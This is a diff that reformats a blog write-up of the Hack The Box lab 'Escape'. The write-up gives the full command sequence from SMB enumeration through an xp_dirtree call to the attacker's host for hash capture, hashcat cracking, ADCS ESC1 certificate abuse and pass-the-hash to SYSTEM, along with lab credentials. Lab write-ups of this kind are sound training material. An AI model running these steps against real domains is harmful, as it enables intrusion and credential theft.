@@ -1,20 +1,18 @@
-# 🏗️ PROTOCOL BREACH: Engineering Total Domain Compromise on HTB Escape
+# Escape
 
 How a simple MSSQL log leak became a roadmap to SYSTEM. Mastering the art of the ADCS ESC1 certificate takeover. 💻👑
 
----
+***
 
 ### Escaping the Domain: From MSSQL Guest to ADCS Domain Admin (ESC1 Exploitation)
 
-**Target:** *Escape (10.10.11.202)* **OS:** *Windows* **Difficulty:** *Medium* **Attack Vectors:** *SMB Enumeration -\> MSSQL Lateral Movement -\> ADCS Misconfiguration (ESC1) -\> Domain Admin*.
+**Target:** _Escape (10.10.11.202)_ **OS:** _Windows_ **Difficulty:** _Medium_ **Attack Vectors:** _SMB Enumeration -> MSSQL Lateral Movement -> ADCS Misconfiguration (ESC1) -> Domain Admin_.
 
 ![](https://cdn-images-1.medium.com/max/800/1*uBb0RqbGXNA8yokYhglu-w.png)
 
-> <a href="https://medium.com/bugbountywriteup/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c?sk=756d32a12d9ba0ae214346d3559b8bd3" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c?sk=756d32a12d9ba0ae214346d3559b8bd3" target="_blank">**Not a Member?? Click Here to read Full-Story**</a>
-
 ### Executive Summary
 
-**Assessment Date:** *January 11, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h/Nicholas Mullenski*
+**Assessment Date:** _January 11, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h/Nicholas Mullenski_
 
 #### Overview
 
@@ -32,13 +30,13 @@ ADCS Misconfiguration (ESC1): The Certificate Authority (CA) was configured with
 
 Organizations must strictly restrict SMB share permissions and regularly audit file contents for sensitive data. Database logs should be sanitized to prevent credential leakage. Most importantly, Certificate Templates within ADCS must be hardened to prevent “Enrollee Supplies Subject” flags on templates that allow client authentication.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance & Enumeration
 
-#### 1.1.1 Nmap Scan
+#### 1.1.1 Nmap Scan
 
-- <span id="a2d5">We began the engagement with a comprehensive port scan to identify the attack surface.</span>
+* We began the engagement with a comprehensive port scan to identify the attack surface.
 
 **Command:**
 
@@ -62,15 +60,15 @@ PORT     STATE SERVICE       VERSION
 
 The scan reveals a rich attack surface typical of a Domain Controller.
 
-- <span id="f530">**Domain:** **`sequel.htb`** (We must add **`10.10.11.202 sequel.htb`** to our `/`**`etc/hosts`** file).</span>
-- <span id="a7dc">**SQL Server (1433):** The presence of MSSQL is the most notable outlier for a standard DC, making it a primary target for enumeration.</span>
-- <span id="91d1">**ADCS:** The **LDAP SSL** certificate issuer is listed as **`sequel-DC-CA`**, confirming that Active Directory Certificate Services are running, which opens up vectors like **ESC1** or **ESC8**.</span>
+* **Domain:** **`sequel.htb`** (We must add **`10.10.11.202 sequel.htb`** to our `/`**`etc/hosts`** file).
+* **SQL Server (1433):** The presence of MSSQL is the most notable outlier for a standard DC, making it a primary target for enumeration.
+* **ADCS:** The **LDAP SSL** certificate issuer is listed as **`sequel-DC-CA`**, confirming that Active Directory Certificate Services are running, which opens up vectors like **ESC1** or **ESC8**.
 
 #### 1.2 SMB Enumeration
 
 #### 1.2.1 Share Discovery
 
-- <span id="fa8e">Since port 445 was open, the next logical step was to check for accessible file shares. We utilized netexec to enumerate shares available to the guest or anonymous user.</span>
+* Since port 445 was open, the next logical step was to check for accessible file shares. We utilized netexec to enumerate shares available to the guest or anonymous user.
 
 **Command:**
 
@@ -92,7 +90,7 @@ SMB         10.10.11.202    445    DC               SYSVOL                      
 
 #### **1.2.2 Information Leakage**
 
-- <span id="b2f1">The Public share permission was set to READ. We connected using smbclient to inspect the contents.</span>
+* The Public share permission was set to READ. We connected using smbclient to inspect the contents.
 
 **Command:**
 
@@ -112,11 +110,11 @@ smb: \>
 
 #### 1.2.3 Findings:
 
-- <span id="4f94">We downloaded the SQL Server Procedures.pdf. Upon analysis, the document contained a sensitive note regarding the configuration of the sql_svc account:</span>
-- <span id="1cd4">**User:** **`PublicUser`**</span>
-- <span id="aa1c">**Password:** **`GuestUserCantWrite1`**</span>
+* We downloaded the SQL Server Procedures.pdf. Upon analysis, the document contained a sensitive note regarding the configuration of the sql\_svc account:
+* **User:** **`PublicUser`**
+* **Password:** **`GuestUserCantWrite1`**
 
-### 2.0 Lateral Movement (MSSQL)
+### 2.0 Lateral Movement (MSSQL)
 
 #### 2.1 Credential Verification
 
@@ -140,7 +138,7 @@ With the valid credentials verified locally, we authenticated to the Microsoft S
 impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.10.11.202'
 ```
 
-#### 2.1.2 Privilege Escalation Vector (xp_dirtree)
+#### 2.1.2 Privilege Escalation Vector (xp\_dirtree)
 
 Once authenticated as the low-privileged **`PublicUser`**, we targeted the SQL Service account (**`sql_svc`**) to elevate privileges. We initiated a **Responder** listener on our attack interface (**`tun0`**) and executed the **`xp_dirtree`** stored procedure. This forced the SQL Server service to connect back to our machine, exposing its NTLMv2 hash.
 
@@ -150,7 +148,7 @@ Once authenticated as the low-privileged **`PublicUser`**, we targeted the SQL S
 EXEC master..xp_dirtree '\\10.10.14.32\share';
 ```
 
-#### 2.1.3 Hash Cracking
+#### 2.1.3 Hash Cracking
 
 Responder successfully captured the hash for `sql_svc`. We utilized **Hashcat** with the `OneRuleToRuleThemAll` rule set to crack the complex password, as standard dictionary attacks failed.
 
@@ -164,10 +162,10 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAl
 
 **Recovered Credentials:**
 
-- <span id="3f12">**User:** sql_svc</span>
-- <span id="22cc">**Password:** REGGIE1234ronnie</span>
+* **User:** sql\_svc
+* **Password:** REGGIE1234ronnie
 
-#### 2.1.4 SMB Enumeration & Second Pivot
+#### 2.1.4 SMB Enumeration & Second Pivot
 
 With the **`sql_svc`** credentials, we transitioned from the database layer to the network layer. Using **`netexec`**, we identified a **`Public`** share on the Domain Controller.
 
@@ -187,10 +185,10 @@ To find the password for **`Ryan.Cooper`**, we returned to the MSSQL Error Logs.
 EXEC xp_readerrorlog;
 ```
 
-- <span id="18a5">**Identified Password:** **`NuclearMosquito3`**</span>
-- <span id="3da1">**Validation:** We successfully verified this password against the **`Ryan.Cooper`** account.</span>
+* **Identified Password:** **`NuclearMosquito3`**
+* **Validation:** We successfully verified this password against the **`Ryan.Cooper`** account.
 
-### 2.1.7 Privilege Escalation (ADCS ESC1)
+### 2.1.7 Privilege Escalation (ADCS ESC1)
 
 With Ryan Cooper’s credentials, we enumerated the Certificate Services. We found that the **`UserAuthentication`** template allowed users to supply a **Subject Alternative Name (SAN)**, making it vulnerable to **ESC1**. We requested a certificate for the **`administrator`** user.
 
@@ -210,8 +208,8 @@ When attempting to authenticate with the **`administrator.pfx`** certificate, th
 faketime -f "+8hours" certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
 ```
 
-- <span id="9f4b">**Result:** Successfully retrieved the NT hash for the Domain Administrator.</span>
-- <span id="6dad">**Admin Hash:** **`a52f78e4c751e5f5e17e1e9XXXXXXX`**</span>
+* **Result:** Successfully retrieved the NT hash for the Domain Administrator.
+* **Admin Hash:** **`a52f78e4c751e5f5e17e1e9XXXXXXX`**
 
 ### 2.1.9 Final Domain Compromise (Root)
 
@@ -223,46 +221,46 @@ With the Domain Administrator’s hash, we performed a Pass-the-Hash (PtH) attac
 impacket-psexec -hashes :a52f78e4c751e5f5e17e1e9f3XXXXX administrator@10.10.11.202
 ```
 
-### 2.1.10 Flag Recovery
+### 2.1.10 Flag Recovery
 
 Upon gaining SYSTEM access, we navigated to the respective user desktops to retrieve the flags.
 
-- <span id="eac9">**User Flag:** **`type C:\Users\Ryan.Cooper\Desktop\user.txt`**</span>
-- <span id="faad">**Root Flag:** **`type C:\Users\Administrator\Desktop\root.txt`**</span>
+* **User Flag:** **`type C:\Users\Ryan.Cooper\Desktop\user.txt`**
+* **Root Flag:** **`type C:\Users\Administrator\Desktop\root.txt`**
 
 ![](https://cdn-images-1.medium.com/max/800/1*hjAEnHsPIkcA5VI_DfrcZQ.png)
 
-### Conclusion and Red Team Mandate
+### Conclusion and Red Team Mandate
 
 The compromise of the **Escape** environment demonstrates the critical danger of information disclosure in system logs and the catastrophic impact of misconfigured Active Directory Certificate Services (ADCS). By chain-linking a simple log leak to an ESC1 certificate vulnerability, we transitioned from a database guest to full Domain Administrator.
 
 **The Mission:** To secure the digital sheepfold by identifying the wolves of misconfiguration before they can strike. We do not just break systems; we reveal the truth so they can be rebuilt stronger.
 
----
+***
 
-### R00t3d In Fa17h: The Word & The Tool
+### R00t3d In Fa17h: The Word & The Tool
 
-> ***Luke 12:2 (NIV)*** “There is nothing concealed that will not be disclosed, or hidden that will not be made known.”
+> _**Luke 12:2 (NIV)**_ “There is nothing concealed that will not be disclosed, or hidden that will not be made known.”
 
 **The Tie-In:** In this lab, the “concealed” truth was Ryan Cooper’s password, hidden not in a secure vault, but in the public-facing error logs of a SQL server. The “hidden” vulnerability was a certificate template that allowed any user to claim they were the Administrator.
 
 Just as the Word of God promises that every secret will eventually come to light, the tools of a penetration tester — like **`xp_readerrorlog`** and **`Certipy`**—act as the light that brings these technical "sins" into the open. We "root" ourselves in the faith that the truth is always findable if we have the patience to seek it. When we uncover these vulnerabilities, we fulfill our mandate to bring hidden dangers into the light so that the environment can be made secure.
 
-### 🚀 Join the Mission
+### 🚀 Join the Mission
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="d58e">Is there a specific tool you wish existed?</span>
-- <span id="4c53">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="d6f5">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/T2rjP8JyNd" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/T2rjP8JyNd" title="https://discord.gg/T2rjP8JyNd"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/T2rjP8JyNd" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="0b09ddb94d53c1efd4ddba1fc01812dc"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/T2rjP8JyNd)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 12, 2026](https://medium.com/p/350ecacf457c).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 12, 2026](https://medium.com/p/350ecacf457c).
 
-<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
